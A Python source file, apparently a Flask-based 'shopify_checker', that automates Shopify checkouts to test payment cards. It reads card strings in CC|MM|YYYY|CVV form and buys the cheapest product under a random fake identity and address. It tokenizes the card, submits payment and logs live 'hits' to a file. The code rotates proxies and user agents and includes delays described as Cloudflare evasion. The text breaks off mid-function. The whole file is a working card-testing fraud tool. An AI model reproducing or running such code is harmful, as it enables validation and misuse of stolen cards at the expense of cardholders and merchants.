import asyncio
import json
import re
import random
import threading
import os
import logging
import time
from urllib.parse import urlparse
from typing import Tuple, Dict, Any, Optional
from flask import Flask, request, jsonify

from curl_cffi.requests import AsyncSession, RequestsError
from graphql import QUERY_PROPOSAL_SHIPPING, QUERY_PROPOSAL_DELIVERY, MUTATION_SUBMIT, QUERY_POLL

logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
logger = logging.getLogger("shopify_checker")

ADDRESS_BOOK = {
    "US": {"address1": "1201 N Market St", "address2": "Suite 100", "city": "Wilmington", "zoneCode": "DE", "postalCode": "19801", "countryCode": "US", "phone": "+13025550143"},
    "CA": {"address1": "700 2 St SW", "address2": "", "city": "Calgary", "zoneCode": "AB", "postalCode": "T2P 2W2", "countryCode": "CA", "phone": "+14035550187"},
    "GB": {"address1": "100 New Bridge St", "address2": "", "city": "London", "zoneCode": "LND", "postalCode": "EC4V 6JA", "countryCode": "GB", "phone": "+442079460912"},
    "AU": {"address1": "100 George St", "address2": "", "city": "Sydney", "zoneCode": "NSW", "postalCode": "2000", "countryCode": "AU", "phone": "+61291234567"},
    "DE": {"address1": "Friedrichstraße 43", "address2": "", "city": "Berlin", "zoneCode": "BE", "postalCode": "10117", "countryCode": "DE", "phone": "+493012345678"},
    "FR": {"address1": "8 Boulevard de la Madeleine", "address2": "", "city": "Paris", "zoneCode": "IDF", "postalCode": "75009", "countryCode": "FR", "phone": "+33142685300"},
    "IN": {"address1": "Bandra Kurla Complex", "address2": "", "city": "Mumbai", "zoneCode": "MH", "postalCode": "400051", "countryCode": "IN", "phone": "+919820012345"},
    "AE": {"address1": "Sheikh Zayed Rd", "address2": "", "city": "Dubai", "zoneCode": "DU", "postalCode": "00000", "countryCode": "AE", "phone": "+97143321111"},
    "DEFAULT": {"address1": "1201 N Market St", "address2": "Suite 100", "city": "Wilmington", "zoneCode": "DE", "postalCode": "19801", "countryCode": "US", "phone": "+13025550143"}
}

CURRENCY_TO_COUNTRY = {
    "USD": "US", "CAD": "CA", "GBP": "GB", "AUD": "AU",
    "EUR": "DE", "INR": "IN", "AED": "AE", "HKD": "HK",
    "CHF": "CH", "NZD": "NZ", "SGD": "SG", "JPY": "JP"
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
]

ACCEPT_LANGS = ["en-US,en;q=0.9", "en-US,en;q=0.8,es;q=0.6", "en-US,en;q=0.9,fr;q=0.8", "en-GB,en;q=0.9"]

_VARIANT_CACHE = {}
_cache_lock = threading.Lock()
_file_lock = threading.Lock()
_HITS_FILE = '/sock/hits.txt' if os.path.isdir('/sock') else 'hits.txt'

class Utils:
    @staticmethod
    def get_random_name() -> Tuple[str, str]:
        first_names = ["James", "John", "Robert", "Michael", "William", "David", "Mary", "Patricia", "Jennifer"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez"]
        return random.choice(first_names), random.choice(last_names)
    
    @staticmethod
    def generate_email(first: str, last: str) -> str:
        domains = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com"]
        return f"{first.lower()}.{last.lower()}@{random.choice(domains)}"

def resolve_address(url: str, currency: Optional[str] = None) -> Dict[str, str]:
    domain = urlparse(url if url.startswith("http") else f"https://{url}").netloc.lower()
    tld = domain.split(".")[-1].upper()
    if tld in ADDRESS_BOOK: return ADDRESS_BOOK[tld]
    if currency:
        country_code = CURRENCY_TO_COUNTRY.get(currency.upper())
        if country_code and country_code in ADDRESS_BOOK: return ADDRESS_BOOK[country_code]
    return ADDRESS_BOOK["DEFAULT"]

def extract_between(text: str, start: str, end: str) -> Optional[str]:
    if not text or not start or not end: return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1 and end in parts[1]: return parts[1].split(end, 1)[0]
    except Exception: pass
    return None

def parse_proxy(proxy_str: str) -> Optional[str]:
    if not proxy_str: return None
    proxy_str = proxy_str.strip()
    if proxy_str.startswith(("http://", "https://", "socks5://")): return proxy_str
    if '@' in proxy_str: return f"http://{proxy_str}"
    parts = proxy_str.split(':')
    if len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
    if len(parts) == 4: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return None

def get_curl_proxy(proxy_str: str) -> Optional[Dict[str, str]]:
    p = parse_proxy(proxy_str)
    if p: return {"http": p, "https": p}
    return None

def is_captcha_required(response_text: str) -> bool:
    if not response_text: return False
    indicators = ['CAPTCHA_REQUIRED', 'captcha required', 'CAPTCHA CHALLENGE', 'hcaptcha', 'h-captcha', 'cf-browser-verification', 'cf-turnstile', 'datadome', 'challenge', 'javascript required']
    text_lower = response_text.lower()
    return any(indicator in text_lower for indicator in indicators)

def extract_clean_response(message: str) -> str:
    if not message: return "UNKNOWN_ERROR"
    message = str(message)
    if "GraphQL Error:" in message: return message[:150].strip()
    patterns = [r'(PAYMENTS_[A-Z_]+)', r'(CARD_[A-Z_]+)', r'([A-Z]+_[A-Z]+_[A-Z_]+)', r'([A-Z]+_[A-Z_]+)', r'code["\']?\s*[:=]\s*["\']?([^"\',]+)["\']?', r'{"code":"([^"]+)"', r"'code':'([^']+)'"]
    for pattern in patterns:
        matches = re.findall(pattern, message, re.IGNORECASE)
        if matches:
            match = matches[0]
            if isinstance(match, tuple): match = match[0]
            if "_" in match and len(match) < 50: return match.strip("{}:'\" ")
    words = message.split()
    if words and "_" in words[0] and words[0].isupper(): return words[0]
    return message[:50]

def parse_cc_string(cc_string: str) -> Dict[str, str]:
    parts = cc_string.split('|')
    if len(parts) != 4: raise ValueError("Invalid CC format. Use: CC|MM|YYYY|CVV")
    return {'cc': parts[0].strip(), 'mes': parts[1].strip(), 'ano': parts[2].strip(), 'cvv': parts[3].strip()}

def save_hit_to_file(cc_string: str, status: str, gateway: str = "", price: str = ""):
    try:
        with _file_lock:
            with open(_HITS_FILE, "a") as f:
                f.write(f"[{status}] {cc_string} - Gateway: {gateway} - Price: {price}\n")
    except Exception as exc: logger.error(f"save_hit_to_file error: {exc}")

def _classify_status(success: bool, response_text: str) -> Optional[str]:
    if not response_text: return None
    upper_text = response_text.upper()
    if "ORDER_PLACED" in upper_text: return "ORDER_PLACED"
    if "INSUFFICIENT_FUNDS" in upper_text or "INSUFFICIENT FUNDS" in upper_text: return "INSUFFICIENT_FUNDS"
    if "OTP" in upper_text or "3DS" in upper_text or "AUTHENTICATION_REQUIRED" in upper_text: return "OTP_REQUIRED"
    return None

class ShopifyCheckoutSession:
    def __init__(self, site_url: str, cc_info: Dict[str, str], variant_id: Optional[str] = None):
        if site_url.startswith('http://'): self.site_url = site_url.replace('http://', 'https://')
        elif not site_url.startswith('https://'): self.site_url = f'https://{site_url}'
        else: self.site_url = site_url
            
        self.domain = urlparse(self.site_url).netloc
        self.cc_info = cc_info
        self.variant_id = variant_id
        self.checkout_url = None
        
        first, last = Utils.get_random_name()
        self.firstName, self.lastName = first, last
        self.email = Utils.generate_email(first, last)
        self.address_info = resolve_address(self.site_url)
        self.phone = self.address_info["phone"]
        self.street = self.address_info["address1"]
        self.address2 = self.address_info["address2"]
        self.city = self.address_info["city"]
        self.state = self.address_info["zoneCode"]
        self.s_zip = self.address_info["postalCode"]
        self.country_code = self.address_info["countryCode"]
        
        self.sst = None
        self.queueToken = ""
        self.stableId = ""
        self.merch = ""
        self.currency = "USD"
        self.subtotal = "0.01"
        self.tax_amount = "0.00"
        self.shipping_amount = "0.00"
        self.running_total = "0.01"
        self.delivery_strategy = ""
        self.payment_identifier = ""
        self.gateway = "UNKNOWN"
        self.checkpoint_data = None
        self.attempt_token = ""
        self.build_id = None
        self.source_token = None
        self.ident_sig = None
        
        self._req_times = []
        self._last_req_time = time.time()

    def get_navigate_headers(self) -> Dict[str, str]:
        """Browser navigation headers with randomization."""
        return {
            'Host': self.domain,
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': random.choice(ACCEPT_LANGS),
            'Sec-Ch-Ua': '"Not A(Brand";v="99", "Google Chrome";v="124", "Chromium";v="124"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
        }

    def get_graphql_headers(self) -> Dict[str, str]:
        """GraphQL request headers."""
        return {
            'Host': self.domain,
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': random.choice(ACCEPT_LANGS),
            'Content-Type': 'application/json',
            'Sec-Ch-Ua': '"Not A(Brand";v="99", "Google Chrome";v="124", "Chromium";v="124"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': self.site_url,
            'Referer': f"{self.site_url}/checkout",
        }

    async def _behavioral_delay(self):
        """CloudFlare heuristic evasion -- natural human timing."""
        elapsed = time.time() - self._last_req_time
        if elapsed < 0.4: await asyncio.sleep(random.uniform(0.5, 1.2))
        elif elapsed < 1.0: await asyncio.sleep(random.uniform(0.2, 0.6))
        self._last_req_time = time.time()

    async def fetch_product_if_needed(self, session) -> Tuple[bool, str]:
        if self.variant_id: return True, "OK"
        with _cache_lock:
            if self.site_url in _VARIANT_CACHE:
                self.variant_id = _VARIANT_CACHE[self.site_url]
                return True, "OK"

        endpoints = [f"{self.site_url}/products.json?limit=250", f"{self.site_url}/collections/all/products.json?limit=250"]
        min_price = float('inf')
        min_variant = None
        last_error = "No endpoints returned products"
        
        for endpoint in endpoints:
            try:
                await self._behavioral_delay()
                resp = await session.get(endpoint, timeout=15, headers=self.get_navigate_headers())
                if resp.status_code != 200: 
                    last_error = f"Status: {resp.status_code}"
                    continue
                data = resp.json()
                products = data.get('products', [])
                if not products: continue
                
                for product in products:
                    for variant in product.get('variants', []):
                        if not variant.get('available', True): continue
                        try:
                            price = float(variant.get('price', 999999))
                            if price <= 0: continue
                            if price < min_price:
                                min_price = price
                                min_variant = str(variant['id'])
                        except: pass
            except Exception as e: last_error = str(e)
                
        if min_variant:
            self.variant_id = min_variant
            with _cache_lock: _VARIANT_CACHE[self.site_url] = self.variant_id
            return True, "OK"
            
        return False, f"Product Fetch Error: {last_error}"

    async def add_to_cart(self, session) -> Tuple[bool, str]:
        try:
            await self._behavioral_delay()
            cart_url = self.site_url + '/cart/add.js'
            
            # Form-urlencoded format (primary)
            headers = self.get_navigate_headers()
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            headers['Origin'] = self.site_url
            headers['Referer'] = f"{self.site_url}/"
            headers['Sec-Fetch-Dest'] = 'empty'
            headers['Sec-Fetch-Mode'] = 'cors'
            headers['Sec-Fetch-Site'] = 'same-origin'
            
            resp = await session.post(cart_url, data=f'id={self.variant_id}&quantity=1', headers=headers, timeout=15)
            
            if resp.status_code != 200:
                # Fallback to JSON
                headers['Content-Type'] = 'application/json'
                r2 = await session.post(cart_url, json={'items': [{'id': int(self.variant_id), 'quantity': 1}]}, headers=headers, timeout=15)
                if r2.status_code != 200: return False, f"Cart failed {r2.status_code}: {r2.text[:60]}"
            
            return True, "OK"
        except Exception as e:
            return False, f"Add to cart error: {str(e)}"

    async def init_checkout(self, session) -> Tuple[bool, str]:
        try:
            await self._behavioral_delay()
            nav_headers = self.get_navigate_headers()
            nav_headers['Referer'] = f"{self.site_url}/cart"
            
            resp = await session.get(self.site_url + '/checkout', allow_redirects=True, headers=nav_headers, timeout=15)
            self.checkout_url = str(resp.url)
            text = resp.text
        except Exception as e:
            return False, f"Init checkout failed: {str(e)}"

        if is_captcha_required(text) or resp.status_code in (403, 429):
            return False, "CAPTCHA_REQUIRED"
        
        url_lower = self.checkout_url.lower()
        if 'login' in url_lower: return False, "Site requires login"
        if 'password' in url_lower: return False, "Site is password protected"
        if '/cart' in url_lower and '/checkouts' not in url_lower:
            return False, "Redirected to Cart (OOS or Empty)"

        match = re.search(r'/checkouts/(?:c|cn|unstable)/([^/?]+)', self.checkout_url)
        self.attempt_token = match.group(1) if match else self.checkout_url.split('/')[-1].split('?')[0]
        self.sst = resp.headers.get('X-Checkout-One-Session-Token') or resp.headers.get('x-checkout-one-session-token')
        
        if not self.sst:
            patterns = [
                r'name="serialized-sessionToken"\s+content="([^"]+)"',
                r'"serializedSessionToken"\s*:\s*"([^"]+)"',
                r'data-session-token="([^"]+)"',
                r'"sessionToken"\s*:\s*"([^"]+)"',
                r'x-checkout-one-session-token"\s*:\s*"([^"]+)"'
            ]
            for p in patterns:
                m = re.search(p, text)
                if m:
                    self.sst = m.group(1).replace('&quot;', '')
                    break
        
        if not self.sst: return False, "Failed to get session token"
        
        self.queueToken = extract_between(text, 'queueToken&quot;:&quot;', '&quot;') or extract_between(text, '"queueToken":"', '"') or ""
        self.stableId = extract_between(text, 'stableId&quot;:&quot;', '&quot;') or extract_between(text, '"stableId":"', '"') or "1"
        self.merch = extract_between(text, 'ProductVariantMerchandise/', '&quot;') or extract_between(text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"') or str(self.variant_id)
        self.currency = extract_between(text, 'currencyCode&quot;:&quot;', '&quot;') or extract_between(text, '"currencyCode":"', '"') or 'USD'
        
        self.subtotal = extract_between(text, 'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&quot;') or extract_between(text, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
        if not self.subtotal:
            price_match = re.search(r'"price":\s*"([\d.]+)"', text)
            self.subtotal = price_match.group(1) if price_match else "0.01"

        self._sync_address_to_currency()

        unescaped = text.replace('&quot;', '"').replace('&amp;', '&').replace('&#39;', "'")
        b_match = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped)
        self.build_id = b_match.group(1) if b_match else None
        
        s_token = extract_between(text, 'name="serialized-sourceToken" content="', '"')
        self.source_token = s_token.replace('&quot;', '').strip('"') if s_token else None
        
        id_match = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped)
        self.ident_sig = id_match.group(1) if id_match else None
            
        return True, "OK"

    def _sync_address_to_currency(self) -> None:
        self.address_info = resolve_address(self.site_url, self.currency)
        self.phone = self.address_info["phone"]
        self.street = self.address_info["address1"]
        self.address2 = self.address_info["address2"]
        self.city = self.address_info["city"]
        self.state = self.address_info["zoneCode"]
        self.s_zip = self.address_info["postalCode"]
        self.country_code = self.address_info["countryCode"]

    async def _graphql_req(self, session, json_data, max_retries=1) -> Tuple[bool, str]:
        graphql_url = f'https://{self.domain}/checkouts/unstable/graphql'
        params = {'operationName': json_data.get('operationName', 'Proposal')}
        headers = self.get_graphql_headers()
        
        for attempt in range(max_retries + 1):
            try:
                await self._behavioral_delay()
                resp = await session.post(graphql_url, params=params, headers=headers, json=json_data, timeout=20)
                resp_text = resp.text
                if is_captcha_required(resp_text): return False, "CAPTCHA_REQUIRED"
                return True, resp_text
            except RequestsError as e:
                if attempt == max_retries: return False, f"Request failed: {str(e)}"
                await asyncio.sleep(1)
            except asyncio.TimeoutError:
                if attempt == max_retries: return False, "Timeout"
                await asyncio.sleep(1)
            except Exception as e:
                if attempt == max_retries: return False, str(e)
                await asyncio.sleep(1)
        return False, "Request failed"

    async def negotiate_shipping(self, session) -> Tuple[bool, str]:
        json_data = {
            'query': QUERY_PROPOSAL_SHIPPING,
            'variables': {
                'sessionInput': {'sessionToken': self.sst}, 'queueToken': self.queueToken,
                'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                'delivery': {
                    'deliveryLines': [{
                        'destination': {
                            'partialStreetAddress': {
                                'address1': self.street, 'address2': self.address2, 'city': self.city,
                                'countryCode': self.country_code, 'postalCode': self.s_zip, 'zoneCode': self.state
                            }
                        },
                        'selectedDeliveryStrategy': {
                            'deliveryStrategyMatchingConditions': {'estimatedTimeInTransit': {'any': True}, 'shipments': {'any': True}},
                            'options': {}
                        },
                        'targetMerchandiseLines': {'lines': [{'stableId': self.stableId}]},
                        'deliveryMethodTypes': ['SHIPPING'], 'expectedTotalPrice': {'any': True}, 'destinationChanged': True
                    }],
                    'noDeliveryRequired': [], 'useProgressiveRates': False, 'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True
                },
                'merchandise': {
                    'merchandiseLines': [{
                        'stableId': self.stableId,
                        'merchandise': {
                            'productVariantReference': {
                                'id': f'gid://shopify/ProductVariantMerchandise/{self.merch}',
                                'variantId': f'gid://shopify/ProductVariant/{self.variant_id}',
                                'properties': [], 'sellingPlanId': None, 'sellingPlanDigest': None
                            }
                        },
                        'quantity': {'items': {'value': 1}}, 'expectedTotalPrice': {'any': True},
                        'lineComponentsSource': None, 'lineComponents': []
                    }]
                },
                'payment': {
                    'totalAmount': {'any': True}, 'paymentLines': [], 
                    'billingAddress': {'streetAddress': {'address1': '', 'address2': '', 'city': '', 'countryCode': self.country_code, 'postalCode': '', 'firstName': '', 'lastName': '', 'zoneCode': 'ENG', 'phone': ''}}
                },
                'buyerIdentity': {
                    'customer': {'presentmentCurrency': self.currency, 'countryCode': self.country_code},
                    'email': self.email, 'emailChanged': False, 'phoneCountryCode': self.country_code,
                    'marketingConsent': [{'email': {'value': self.email}}], 'shopPayOptInPhone': {'number': self.phone, 'countryCode': self.country_code}, 'rememberMe': False
                },
                'taxes': {'proposedAllocations': None, 'proposedTotalAmount': {'any': True}, 'proposedTotalIncludedAmount': None, 'proposedMixedStateTotalAmount': None, 'proposedExemptions': []},
                'tip': {'tipLines': []}, 'note': {'message': None, 'customAttributes': []}, 'localizationExtension': {'fields': []}, 'nonNegotiableTerms': None, 'optionalDuties': {'buyerRefusesDuties': False}
            },
            'operationName': 'Proposal'
        }
        
        for attempt in range(4):
            success, text = await self._graphql_req(session, json_data)
            if not success: return False, text
            try:
                resp = json.loads(text)
                if 'errors' in resp: return False, f"GraphQL Error: {'; '.join([e.get('message', '') for e in resp['errors']])}"
                
                result_data = resp.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
                if not result_data: return False, "Empty negotiation result"
                    
                if result_data.get('__typename') in ('CheckpointDenied', 'Throttled'): return False, result_data.get('__typename')
                
                self.checkpoint_data = result_data.get('checkpointData')
                sp = result_data.get('sellerProposal', {})
                
                if sp.get('delivery', {}).get('__typename') == 'PendingTerms' or sp.get('tax', {}).get('__typename') == 'PendingTerms':
                    await asyncio.sleep(1.5)
                    continue
                
                delivery = sp.get('delivery', {})
                if delivery.get('__typename') == 'FilledDeliveryTerms':
                    lines = delivery.get('deliveryLines', [{}])
                    if lines:
                        strats = lines[0].get('availableDeliveryStrategies', [])
                        if strats:
                            cheapest_strat = min(strats, key=lambda s: float(s.get('amount', {}).get('value', {}).get('amount', '999999')))
                            self.delivery_strategy = cheapest_strat.get('handle', '')
                            amt = cheapest_strat.get('amount', {}).get('value', {}).get('amount')
                            if amt: self.shipping_amount = str(amt)
                            
                tax = sp.get('tax', {})
                if tax.get('__typename') == 'FilledTaxTerms':
                    t_amt = tax.get('totalTaxAmount', {}).get('value', {}).get('amount')
                    if t_amt: self.tax_amount = str(t_amt)
                    
                for field in ['checkoutTotal', 'runningTotal', 'total']:
                    rt_data = sp.get(field, {})
                    if rt_data and rt_data.get('__typename') == 'MoneyValueConstraint':
                        r_amt = rt_data.get('value', {}).get('amount')
                        if r_amt: self.running_total = str(r_amt); break
                            
                payment = sp.get('payment', {})
                if payment.get('__typename') == 'FilledPaymentTerms':
                    for method in payment.get('availablePaymentLines', []):
                        pm = method.get('paymentMethod', {})
                        if pm.get('name') or pm.get('paymentMethodIdentifier'):
                            self.payment_identifier = pm.get('paymentMethodIdentifier')
                            self.gateway = pm.get('extensibilityDisplayName') or pm.get('name', 'UNKNOWN')
                            break
                            
                if not self.payment_identifier: return False, "NO_DIRECT_CC_GATEWAY_AVAILABLE"
                return True, "OK"
            except Exception as e: return False, f"Shipping Parse Error: {str(e)}"
        return False, "Timed out waiting for PendingTerms"

    async def negotiate_delivery(self, session) -> Tuple[bool, str]:
        if not self.delivery_strategy: return True, "OK"
            
        json_data = {
            'query': QUERY_PROPOSAL_DELIVERY,
            'variables': {
                'sessionInput': {'sessionToken': self.sst}, 'queueToken': self.queueToken,
                'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                'delivery': {
                    'deliveryLines': [{
                        'destination': {
                            'streetAddress': {
                                'address1': self.street, 'address2': self.address2, 'city': self.city, 'countryCode': self.country_code,
                                'postalCode': self.s_zip, 'firstName': self.firstName, 'lastName': self.lastName, 'zoneCode': self.state, 'phone': self.phone
                            }
                        },
                        'selectedDeliveryStrategy': {'deliveryStrategyByHandle': {'handle': self.delivery_strategy, 'customDeliveryRate': False}, 'options': {}},
                        'targetMerchandiseLines': {'lines': [{'stableId': self.stableId}]},
                        'deliveryMethodTypes': ['SHIPPING'], 'expectedTotalPrice': {'any': True}, 'destinationChanged': False
                    }],
                    'noDeliveryRequired': [], 'useProgressiveRates': False, 'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True
                },
                'merchandise': {
                    'merchandiseLines': [{
                        'stableId': self.stableId,
                        'merchandise': {'productVariantReference': {'id': f'gid://shopify/ProductVariantMerchandise/{self.merch}', 'variantId': f'gid://shopify/ProductVariant/{self.variant_id}', 'properties': [], 'sellingPlanId': None, 'sellingPlanDigest': None}},
                        'quantity': {'items': {'value': 1}}, 'expectedTotalPrice': {'any': True}, 'lineComponentsSource': None, 'lineComponents': []
                    }]
                },
                'payment': {'totalAmount': {'any': True}, 'paymentLines': [], 'billingAddress': {'streetAddress': {'address1': '', 'address2': '', 'city': '', 'countryCode': self.country_code, 'postalCode': '', 'firstName': '', 'lastName': '', 'zoneCode': 'ENG', 'phone': ''}}},
                'buyerIdentity': {'customer': {'presentmentCurrency': self.currency, 'countryCode': self.country_code}, 'email': self.email, 'emailChanged': False, 'phoneCountryCode': self.country_code, 'marketingConsent': [{'email': {'value': self.email}}], 'shopPayOptInPhone': {'number': self.phone, 'countryCode': self.country_code}, 'rememberMe': False},
                'taxes': {'proposedAllocations': None, 'proposedTotalAmount': {'any': True}, 'proposedTotalIncludedAmount': None, 'proposedMixedStateTotalAmount': None, 'proposedExemptions': []},
                'tip': {'tipLines': []}, 'note': {'message': None, 'customAttributes': []}, 'localizationExtension': {'fields': []}, 'nonNegotiableTerms': None, 'optionalDuties': {'buyerRefusesDuties': False}
            },
            'operationName': 'Proposal'
        }
        
        for attempt in range(3):
            success, text = await self._graphql_req(session, json_data)
            if not success: return False, text
            try:
                resp = json.loads(text)
                if 'errors' in resp: return False, f"GraphQL Error: {'; '.join([e.get('message', '') for e in resp.get('errors', [])])}"
                
                result_data = resp.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
                if not result_data: return False, "Empty result"
                    
                if result_data.get('__typename') in ('CheckpointDenied', 'Throttled'): return False, result_data.get('__typename')
                
                self.checkpoint_data = result_data.get('checkpointData')
                sp = result_data.get('sellerProposal', {})
                
                if sp.get('delivery', {}).get('__typename') == 'PendingTerms':
                    await asyncio.sleep(1.5)
                    continue
                        
                delivery = sp.get('delivery', {})
                if delivery.get('__typename') == 'FilledDeliveryTerms':
                    lines = delivery.get('deliveryLines', [{}])
                    if lines:
                        selected_strat = lines[0].get('selectedDeliveryStrategy', {})
                        if selected_strat and selected_strat.get('__typename') == 'CompleteDeliveryStrategy':
                            self.delivery_strategy = selected_strat.get('handle', self.delivery_strategy)
                                
                tax = sp.get('tax', {})
                if tax.get('__typename') == 'FilledTaxTerms':
                    t_amt = tax.get('totalTaxAmount', {}).get('value', {}).get('amount')
                    if t_amt: self.tax_amount = str(t_amt)
                        
                for field in ['checkoutTotal', 'runningTotal', 'total']:
                    rt_data = sp.get(field, {})
                    if rt_data and rt_data.get('__typename') == 'MoneyValueConstraint':
                        r_amt = rt_data.get('value', {}).get('amount')
                        if r_amt: self.running_total = str(r_amt); break
                return True, "OK"
            except Exception: pass 
        return True, "OK"

    async def tokenize_card(self, session) -> Tuple[bool, str]:
        payload = {
            "credit_card": {
                "number": self.cc_info['cc'], "month": int(self.cc_info['mes']), "year": int(self.cc_info['ano']),
                "verification_value": self.cc_info['cvv'], "name": f"{self.firstName} {self.lastName}",
                "start_month": None, "start_year": None, "issue_number": ""
            },
            "payment_session_scope": self.domain
        }
        vault_headers = {
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': 'https://checkout.pci.shopifyinc.com',
            'referer': 'https://checkout.pci.shopifyinc.com/',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
        }
        if self.ident_sig: vault_headers['shopify-identification-signature'] = self.ident_sig
        try:
            await self._behavioral_delay()
            resp = await session.post('https://checkout.pci.shopifyinc.com/sessions', json=payload, headers=vault_headers, timeout=20)
            
            if resp.status_code not in (200, 201):
                return False, f"Vault Blocked HTTP {resp.status_code}: {resp.text[:60]}"
            
            try:
                data = resp.json()
            except Exception:
                return False, f"Vault JSON Error: {resp.text[:60]}"
                
            token = data.get('id')
            if not token: return False, f"Vault missing token: {resp.text[:60]}"
            
            return True, token
        except Exception as e: return False, f'Tokenization error: {str(e)}'

    async def submit_payment(self, session, token: str) -> Tuple[bool, str, str]:
        submit_vars = {
            'input': {
                'sessionInput': {'sessionToken': self.sst}, 'queueToken': self.queueToken,
                'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                'delivery': {
                    'deliveryLines': [{
                        'destination': {
                            'streetAddress': {
                                'address1': self.street, 'address2': self.address2, 'city': self.city, 'countryCode': self.country_code,
                                'postalCode': self.s_zip, 'firstName': self.firstName, 'lastName': self.lastName, 'zoneCode': self.state, 'phone': self.phone
                            }
                        },
                        'selectedDeliveryStrategy': {'deliveryStrategyByHandle': {'handle': self.delivery_strategy, 'customDeliveryRate': False}, 'options': {}},
                        'targetMerchandiseLines': {'lines': [{'stableId': self.stableId}]},
                        'deliveryMethodTypes': ['SHIPPING'], 'expectedTotalPrice': {'any': True}, 'destinationChanged': False
                    }] if self.delivery_strategy else [],
                    'noDeliveryRequired': [], 'useProgressiveRates': True, 'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True
                },
                'merchandise': {
                    'merchandiseLines': [{
                        'stableId': self.stableId,
                        'merchandise': {'productVariantReference': {'id': f'gid://shopify/ProductVariantMerchandise/{self.merch}', 'variantId': f'gid://shopify/ProductVariant/{self.variant_id}', 'properties': [], 'sellingPlanId': None, 'sellingPlanDigest': None}},
                        'quantity': {'items': {'value': 1}}, 'expectedTotalPrice': {'any': True}, 'lineComponentsSource': None, 'lineComponents': []
                    }]
                },
                'payment': {
                    'totalAmount': {'any': True},
                    'paymentLines': [{
                        'paymentMethod': {
                            'directPaymentMethod': {
                                'paymentMethodIdentifier': self.payment_identifier, 'sessionId': token,
                                'billingAddress': {
                                    'streetAddress': {
                                        'address1': self.street, 'address2': self.address2, 'city': self.city, 'countryCode': self.country_code, 'postalCode': self.s_zip,
                                        'firstName': self.firstName, 'lastName': self.lastName, 'zoneCode': self.state, 'phone': self.phone
                                    }
                                },
                                'cardSource': None
                            }
                        },
                        'amount': {'value': {'amount': self.running_total, 'currencyCode': self.currency}}, 'dueAt': None
                    }],
                    'billingAddress': {'streetAddress': {'address1': self.street, 'address2': self.address2, 'city': self.city, 'countryCode': self.country_code, 'postalCode': self.s_zip, 'firstName': self.firstName, 'lastName': self.lastName, 'zoneCode': self.state, 'phone': self.phone}}
                },
                'buyerIdentity': {
                    'customer': {'presentmentCurrency': self.currency, 'countryCode': self.country_code},
                    'email': self.email, 'emailChanged': False, 'phoneCountryCode': self.country_code, 
                    'marketingConsent': [{'email': {'value': self.email}}], 'shopPayOptInPhone': {'number': self.phone, 'countryCode': self.country_code}, 'rememberMe': False
                },
                'taxes': {'proposedAllocations': None, 'proposedTotalAmount': {'any': True}, 'proposedTotalIncludedAmount': None, 'proposedMixedStateTotalAmount': None, 'proposedExemptions': []},
                'tip': {'tipLines': []}, 'note': {'message': None, 'customAttributes': []}, 'localizationExtension': {'fields': []}, 'nonNegotiableTerms': None, 'optionalDuties': {'buyerRefusesDuties': False}
            },
            'attemptToken': self.attempt_token, 'metafields': [], 'analytics': {'requestUrl': self.checkout_url}
        }
        if self.checkpoint_data: submit_vars['input']['checkpointData'] = self.checkpoint_data
        json_data = {'query': MUTATION_SUBMIT, 'variables': submit_vars, 'operationName': 'SubmitForCompletion'}
        success, text = await self._graphql_req(session, json_data)
        if not success: return False, text, ""
        
        try:
            resp = json.loads(text)
